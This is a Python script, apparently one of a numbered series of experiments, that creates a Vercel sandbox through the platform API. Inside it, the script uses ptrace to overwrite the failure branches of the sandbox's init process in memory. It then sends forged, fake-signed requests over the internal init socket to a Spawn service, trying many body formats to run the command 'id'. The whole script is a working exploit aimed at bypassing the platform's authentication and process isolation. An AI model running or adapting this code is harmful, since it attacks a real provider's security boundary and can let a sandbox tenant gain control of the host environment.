# 实验J64: j61 patch 配置 (不 patch 入口) + envelope body 格式矩阵
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj64"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import os, re, struct, subprocess, json, time, ctypes, base64

b = open("/run/vercel/share/sandbox-init", "rb").read()

print("===== [1] patch 失败分支 (j61 配置, 不 patch 入口) =====", flush=True)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.ptrace.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_long
libc.waitpid.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_int]
libc.waitpid.restype = ctypes.c_int

def ptrace_rw(addr, data=None, read_len=0):
    libc.ptrace(16, 1, None, None)
    wp = libc.waitpid(1, None, 0)
    if wp != 1:
        libc.ptrace(17, 1, None, None)
        return -1, "waitpid=%d" % wp
    if data is not None:
        PTRACE_POKEDATA = 5
        ok = 0
        total = (len(data) + 7) // 8
        for off in range(0, len(data), 8):
            word = int.from_bytes(data[off:off+8].ljust(8, b"\x00"), "little")
            r = libc.ptrace(PTRACE_POKEDATA, 1, addr + off, word)
            if r == 0:
                ok += 1
        libc.ptrace(17, 1, None, None)
        return ok, total
    else:
        PTRACE_PEEKDATA = 4
        out = b""
        off = 0
        while off < read_len:
            v = libc.ptrace(PTRACE_PEEKDATA, 1, addr + off, None)
            if v == -1:
                break
            out += (v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little")
            off += 8
        libc.ptrace(17, 1, None, None)
        return len(out), out

PATCH_A = bytes.fromhex("31c031db4881c4d00000005dc3")
for va in [0x83b571, 0x83b5af]:
    ok, total = ptrace_rw(va, data=PATCH_A)
    print("PATCH A @ %s: %d/%d" % (hex(va), ok, total), flush=True)
PATCH_B = bytes.fromhex("31c031db4881c4900000005dc3")
ok, total = ptrace_rw(0x82a9f9, data=PATCH_B)
print("PATCH B: %d/%d" % (ok, total), flush=True)

print("===== [2] body 格式矩阵 (含 envelope) =====", flush=True)
def ccall_raw(path, body_bytes, hdrs, ctype, timeout=10):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", "/run/vercel/share/init.sock",
           "-H", "Content-Type: " + ctype,
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in hdrs.items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["--data-binary", "@-"]
    try:
        r = subprocess.run(cmd, input=body_bytes, capture_output=True, timeout=timeout+2)
        return r.stdout.decode("latin1", errors="replace")
    except Exception as e:
        return "EXC " + str(e)

ts = str(int(time.time() * 1000))
HDRS = {"x-timestamp": ts, "x-signature": base64.b64encode(b"\x99" * 64).decode()}
json_body = b'{"command":"id"}'
proto_body = b'\x0a\x02\x69\x64'
def env(payload, flags=0):
    return bytes([flags]) + struct.pack(">I", len(payload)) + payload

tests = [
    ("env+json", env(json_body), "application/connect+json"),
    ("env+proto", env(proto_body), "application/connect+proto"),
    ("env+proto/jsonct", env(proto_body), "application/connect+json"),
    ("env+json/protoct", env(json_body), "application/connect+proto"),
    ("env+json+flag80", env(json_body, 0x80), "application/connect+json"),
    ("env+proto+flag80", env(proto_body, 0x80), "application/connect+proto"),
    ("grpc-env+proto", env(proto_body), "application/grpc"),
    ("grpc-env+json", env(json_body), "application/grpc+json"),
    ("double-env+json", env(env(json_body)), "application/connect+json"),
]
for label, body_b, ct in tests:
    out = ccall_raw("/vercel.sandbox.spawn.v1.SpawnService/Spawn", body_b, HDRS, ct)
    m = re.search(r'\{"error".*?\}', out)
    st = m.group(0) if m else ("NOERR " + out[-400:])
    print("[%-20s] %s" % (label, st.replace("\r\n", " | ")[:350]), flush=True)
    if len(out) > 30 and (m is None or "unauthenticated" not in st):
        print("    RAW: %r" % out[:500], flush=True)

print("===== [3] 恢复失败分支 (验证恢复能力) =====", flush=True)
# 重新写入原字节看 sandbox-init 是否还活着
orig_A = b[0x43b571:0x43b571+13]
ok, total = ptrace_rw(0x83b571, data=orig_A)
print("restore A: %d/%d" % (ok, total), flush=True)
out = ccall_raw("/vercel.sandbox.spawn.v1.SpawnService/Spawn", env(json_body), HDRS, "application/connect+json")
print("after restore:", out[:300].replace("\r\n", " | "), flush=True)
'''
run_cmd(sid, SCAN, "envelope-body-matrix", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
